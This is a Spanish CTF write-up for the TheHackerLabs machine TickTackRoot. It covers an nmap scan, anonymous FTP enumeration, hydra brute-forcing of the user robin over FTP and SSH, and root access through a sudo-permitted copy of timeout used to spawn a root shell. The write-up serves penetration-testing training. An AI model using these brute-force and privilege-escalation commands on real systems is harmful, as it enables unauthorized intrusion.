---
title: "TickTackRoot - TheHackerLabs"
date: 2025-07-04
draft: false
slug: "THL-writeup-tickTackRoot"
excerpt: "Esta fue una máquina sencilla. Después de analizar el escaneo de servicios, vemos información interesante en el servicio FTP activo en el puerto 21 de la máquina víctima, por lo que entramos a este como el usuario anonymous. Al entrar, vemos un mensaje de bienvenida a un usuario y encontramos un archivo de texto con algunos posibles usuarios. Utilizamos al usuario a quien se le da la bienvenida para aplicarle fuerza bruta por FTP y SSH con hydra, logrando obtener su contraseña para ambos servicios, siendo la misma. Dentro de la máquina, revisamos los privilegios que tenemos, descubriendo que podemos usar una copia del binario timeout como Root. Utilizamos la guía de GTFOBins para encontrar y usar una forma de escalar privilegios, convirtiéndonos así en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "FTP", "SSH", "FTP Enumeration", "Brute Force Attack", "Password Reuse", "Abusing Sudoers Privileges", "Binary Analysis", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "ftp"
  - "echo"
  - "cat"
  - "hydra"
  - "ssh"
  - "grep"
  - "sudo"
  - "which"
  - "md5sum"
  - "sha256sum"
  - "cmp"
  - "find"
  - "GTFOBins"
  - "timeout"
links:
  - "https://gtfobins.github.io/gtfobins/timeout/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-tickTackRoot/TickTackRoot.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.160
PING 192.168.10.160 (192.168.10.160) 56(84) bytes of data.
64 bytes from 192.168.10.160: icmp_seq=1 ttl=64 time=9.25 ms
64 bytes from 192.168.10.160: icmp_seq=2 ttl=64 time=1.05 ms
64 bytes from 192.168.10.160: icmp_seq=3 ttl=64 time=1.23 ms
64 bytes from 192.168.10.160: icmp_seq=4 ttl=64 time=1.53 ms

--- 192.168.10.160 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3017ms
rtt min/avg/max/mdev = 1.049/3.262/9.246/3.458 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.160 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-04 12:28 CST
Initiating ARP Ping Scan at 12:28
Scanning 192.168.10.160 [1 port]
Completed ARP Ping Scan at 12:28, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:28
Scanning 192.168.10.160 [65535 ports]
Discovered open port 22/tcp on 192.168.10.160
Discovered open port 80/tcp on 192.168.10.160
Discovered open port 21/tcp on 192.168.10.160
Completed SYN Stealth Scan at 12:28, 8.35s elapsed (65535 total ports)
Nmap scan report for 192.168.10.160
Host is up, received arp-response (0.00085s latency).
Scanned at 2025-07-04 12:28:04 CST for 8s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.59 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos, aunque es interesante ver el **puerto 21**, que es del **servicio FTP**, activo en una máquina **Linux**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,22,80 192.168.10.160 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-04 12:29 CST
Nmap scan report for 192.168.10.160
Host is up (0.0013s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0           10671 Oct 03  2024 index.html
|_drwxr-xr-x    2 0        0            4096 Oct 07  2024 login
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:Tu_IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 5c:38:6e:8a:4b:bb:b4:2a:ca:cb:3a:94:62:9c:aa:7e (ECDSA)
|_  256 06:c4:ea:41:7d:c3:4b:f7:8c:68:19:6b:5c:23:e4:70 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))

|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Excelente, tenemos acceso al **servicio FTP** como el **usuario anonymous** y, de hecho, podemos ver un archivo y un directorio, quizá son de la página web activa.

Además, la página web muestra la página por defecto de **Apache2**.

Vamos a empezar por el **servicio FTP** y luego por la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de Servicio FTP {#FTP}

Entremos:
```bash
ftp 192.168.10.160
Connected to 192.168.10.160.
220 Bienvenido Robin
Name (192.168.10.160:berserkwings): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Interesante, podemos ver que le da la bienvenida a un usuario llamado **Robin**.

Guardemos ese usuario para más adelante.

Veamos qué archivos encontramos:
```bash
ftp> ls
229 Entering Extended Passive Mode (|||18264|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0           10671 Oct 03  2024 index.html
drwxr-xr-x    2 0        0            4096 Oct 07  2024 login
226 Directory send OK.
ftp> cd login
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||28484|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              14 Oct 07  2024 login.txt
226 Directory send OK.
ftp>
```
El archivo **index.html** parece ser la página por defecto de **Apache2**, y dentro del directorio login, encontramos un archivo de texto que quizá tenga credenciales de acceso para el **servicio SSH**.

Vamos a descargar solo el archivo de texto:
```bash
ftp> get login.txt
local: login.txt remote: login.txt
229 Entering Extended Passive Mode (|||45926|)
150 Opening BINARY mode data connection for login.txt (14 bytes).
100% |**********************************|    14        6.39 KiB/s    00:00 ETA
226 Transfer complete.
14 bytes received in 00:00 (0.40 KiB/s)
```
Y antes de salirnos, tratemos de subir un archivo random, con tal de ver si tenemos capacidad de subida de archivos al **servicio FTP**.

Crea un archivo random:
```bash
echo "test" > test.txt
cat test.txt
test
```

Entra de nuevo al **FTP** e intenta subir el archivo:
```bash
ftp> put test.txt 
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49072|)
550 Permission denied.
```
No tenemos permisos suficientes para subir archivos.

Entonces, veamos el contenido del archivo de texto que descargamos antes:
```bash
cat login.txt
rafael
monica
```
Son solo nombres, y si los intentamos probar para ganar acceso a la máquina vía **SSH**, no obtendremos ningún resultado.

Te diría que tratásemos de buscar si hay algo en la página web activa, pero no encontraremos nada.

Como tenemos 3 posibles usuarios, podemos tratar de aplicarles fuerza bruta y ver si ganamos acceso con alguno de ellos.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta a Posibles Usuarios del Servicio FTP y Servicio SSH {#fuerzaBruta}

Analizando los usuarios, del que podemos asegurar que obtendremos una contraseña es del **usuario robin**, pues es a quien se le da la bienvenida en el **servicio FTP**, por lo que es muy probable que exista tanto en **FTP** como en **SSH**.

Primero, probemos con el **FTP** usando **hydra** para aplicarle fuerza bruta:
```bash
hydra -l 'robin' -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.160 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-04 13:25:06
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://192.168.10.160:21/
[21][ftp] host: 192.168.10.160   login: robin   password: *****
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 15 final worker threads did not complete until end.
[ERROR] 15 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-04 13:25:53
```
Excelente, tenemos su contraseña para el **servicio FTP**.

Probémosla:
```bash
ftp 192.168.10.160
Connected to 192.168.10.160.
220 Bienvenido Robin
Name (192.168.10.160:berserkwings): robin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||63841|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              21 Oct 07  2024 user.txt
226 Directory send OK.
```
Parece que el **FTP** está montado sobre el **servicio SSH** para este usuario.

Comprobémoslo:
```bash
ftp> cd /
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||45975|)
150 Here comes the directory listing.
lrwxrwxrwx    1 0        0               7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x    2 0        0            4096 Feb 26  2024 bin.usr-is-merged
drwxr-xr-x    3 0        0            4096 Oct 02  2024 boot
dr-xr-xr-x    2 0        0            4096 Aug 27  2024 cdrom
drwxr-xr-x   19 0        0            4040 Jul 04 18:23 dev
drwxr-xr-x  109 0        0            4096 Oct 15  2024 etc
drwxr-xr-x    3 0        0            4096 Oct 07  2024 home
lrwxrwxrwx    1 0        0               7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x    2 0        0            4096 Feb 26  2024 lib.usr-is-merged
lrwxrwxrwx    1 0        0               9 Apr 22  2024 lib64 -> usr/lib64
drwx------    2 0        0           16384 Oct 02  2024 lost+found
drwxr-xr-x    2 0        0            4096 Aug 27  2024 media
drwxr-xr-x    2 0        0            4096 Aug 27  2024 mnt
drwxr-xr-x    2 0        0            4096 Aug 27  2024 opt
dr-xr-xr-x  165 0        0               0 Jul 04 18:23 proc
drwx------    5 0        0            4096 Oct 10  2024 root
...
```
En efecto, entonces, es muy probable que esté ocupando la misma contraseña para el **SSH**.

Por si las dudas, apliquemos fuerza bruta al **SSH**:
```bash
hydra -l 'robin' -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.160 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-04 12:51:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.10.160:22/
[22][ssh] host: 192.168.10.160  login: robin   password: ******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 26 final worker threads did not complete until end.
[ERROR] 26 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-04 12:52:01
```
Sí, utiliza la misma contraseña para **SSH**.

Probémoslo:
```bash
ssh robin@192.168.10.160
robin@192.168.10.160's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)
...
Last login: Tue Oct 15 08:45:45 2024
robin@TheHackersLabs-Ticktackroot:~$ whoami
robin
```
Estamos dentro.

Veamos la flag del usuario:
```bash
robin@TheHackersLabs-Ticktackroot:~$ ls
user.txt
robin@TheHackersLabs-Ticktackroot:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima y Escalando Privilegios con Binario timeout {#linEnum}

Veamos qué usuarios existen en la máquina:
```bash
robin@TheHackersLabs-Ticktackroot:~$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
oscar:x:1000:1000:oscar:/home/oscar:/bin/bash
robin:x:1001:1001:robin,,,:/home/robin:/bin/bash
```

Aparte del **usuario robin**, existe el **usuario oscar**, pero este no tiene un directorio dentro de `/home`:
```bash
robin@TheHackersLabs-Ticktackroot:~$ ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 oct  7  2024 .
drwxr-xr-x 23 root  root  4096 oct  2  2024 ..
drwxr-x---  3 robin robin 4096 oct 10  2024 robin
```

Veamos qué privilegios tiene nuestro usuario:
```bash
robin@TheHackersLabs-Ticktackroot:~$ sudo -l
Matching Defaults entries for robin on TheHackersLabs-Ticktackroot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User robin may run the following commands on TheHackersLabs-Ticktackroot:
    (ALL) NOPASSWD: /usr/bin/timeout_suid
```
Podemos usar el binario **timeout_suid** como **Root**

Pero me da curiosidad el nombre, pues existe un binario similar llamado **timeout**.

Quizá son los mismos y podemos comprobarlo revisando su **hash MD5** o su **hash SHA256** de cada binario.

Revisemos si tenemos estas dos herramientas en la máquina víctima:
```bash
robin@TheHackersLabs-Ticktackroot:~$ which md5sum && which sha256sum
/usr/bin/md5sum
/usr/bin/sha256sum
```
Bien, tenemos ambos.

Ahora, saquemos los hashes y comparémoslos. Si es una copia, debería tener el mismo hash para ambos casos:
```bash
robin@TheHackersLabs-Ticktackroot:~$ md5sum /usr/bin/timeout /usr/bin/timeout_suid && sha256sum /usr/bin/timeout /usr/bin/timeout_suid
915fe2eea53185caeb2088cf4d4689cd  /usr/bin/timeout
915fe2eea53185caeb2088cf4d4689cd  /usr/bin/timeout_suid
2ee918a5358c0388719e710134bc32cffb934f4bd2a8fb9beb86ef4d6ec8bd8a  /usr/bin/timeout
2ee918a5358c0388719e710134bc32cffb934f4bd2a8fb9beb86ef4d6ec8bd8a  /usr/bin/timeout_suid
```
A simple vista, podemos ver que los hashes son idénticos, por lo que comprobamos que el **binario timeout_suid** es una copia del **binario timeout**.

Pero si aún tienes duda, podrías guardar el **hash MD5 y SHA256** de cada binario en un archivo y utilizar el comando **diff**, para que busque diferencias en los hashes.

O una buena opción, es el comando **cmp**, que compara dos archivos byte por byte.

Veamos si lo tenemos en esta máquina:
```bash
robin@TheHackersLabs-Ticktackroot:~$ which cmp
/usr/bin/cmp
```
Bien, entonces le damos los archivos a revisar y nos dirá si hay diferencia o no.

Aunque le agregaré un **echo** para que lo diga con más claridad:
```bash
robin@TheHackersLabs-Ticktackroot:~$ cmp -s /usr/bin/timeout /usr/bin/timeout_suid && echo "Son idénticos" || echo "Son diferentes"
Son idénticos
```
Genial, son el mismo binario.

Una cosita más, si investigamos si hay algún archivo con **permisos SUID**, aparecerá ese binario:
```bash
robin@TheHackersLabs-Ticktackroot:~$ find / -perm -4000 2>/dev/null
/usr/bin/fusermount3
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/timeout_suid
...
robin@TheHackersLabs-Ticktackroot:~$ ls -la /usr/bin/timeout_suid
-rwsr-sr-x 1 root root 39880 oct  7  2024 /usr/bin/timeout_suid
```

Ahora, si investigamos el **binario timeout** en la **guía de GTFOBins**, encontraremos una forma de escalar privilegios:
* <a href="https://gtfobins.github.io/gtfobins/timeout/" target="_blank">GTFOBins: timeout</a>

Utilizaremos este:

<p align="center">
<img src="/assets/images/THL-writeup-tickTackRoot/Captura1.png">
</p>

Probémoslo:
```bash
robin@TheHackersLabs-Ticktackroot:~$ sudo timeout_suid --foreground 7d /bin/bash
root@TheHackersLabs-Ticktackroot:/home/robin# whoami
root
```
Excelente, ya somos **Root**.

Vayamos por la última flag:
```bash
root@TheHackersLabs-Ticktackroot:/home/robin# cd /root/
root@TheHackersLabs-Ticktackroot:~# ls
root.txt
root@TheHackersLabs-Ticktackroot:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
